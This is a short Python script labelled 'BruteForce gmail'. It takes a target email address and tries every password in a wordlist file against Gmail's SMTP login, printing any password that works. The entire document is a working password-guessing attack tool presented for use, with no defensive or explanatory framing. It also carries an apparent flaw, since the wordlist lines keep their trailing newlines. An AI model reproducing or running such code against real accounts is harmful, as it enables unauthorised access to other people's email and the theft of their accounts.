### Programmer by othr
###  BruteForce gmail

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

email = input("Enter email:")
password_ = open('password.txt', "r")

for password in password_:
        try:
                smtpserver.login(email, password)

                print("[+] Password Found: {}".format(password))
                break
        except smtplib.SMTPAuthenticationError:
                print("[!] Password Incorrect: {}".format(password))
